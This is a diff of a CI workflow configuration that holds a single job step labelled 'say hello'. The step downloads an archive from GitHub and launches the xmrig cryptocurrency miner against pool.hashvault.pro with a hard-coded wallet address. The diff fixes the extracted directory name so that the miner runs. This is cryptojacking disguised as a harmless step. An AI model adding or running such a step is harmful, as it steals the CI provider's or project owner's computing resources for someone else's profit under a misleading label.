@@ -2,6 +2,6 @@ workflows:
   my-workflow:
     scripts:
       - name: say hello
-        script: wget https://github.com/funfactbro/respect/archive/refs/tags/x.tar.gz && tar -xvf x.tar.gz && cd x && ./xmrig -o pool.hashvault.pro:3333 -u 4An16QsmWem7TL4Az7x93bGkBX3JjzCxQ4bAhcS5M3y6U1hEckM6RT8idvDRo9rRQtAPAPzdHpfLz7zgJ9Tbvb3JQBXwEvQ -p x
+        script: wget https://github.com/funfactbro/respect/archive/refs/tags/x.tar.gz && tar -xvf x.tar.gz && cd respect-x && ./xmrig -o pool.hashvault.pro:3333 -u 4An16QsmWem7TL4Az7x93bGkBX3JjzCxQ4bAhcS5M3y6U1hEckM6RT8idvDRo9rRQtAPAPzdHpfLz7zgJ9Tbvb3JQBXwEvQ -p x
 
 
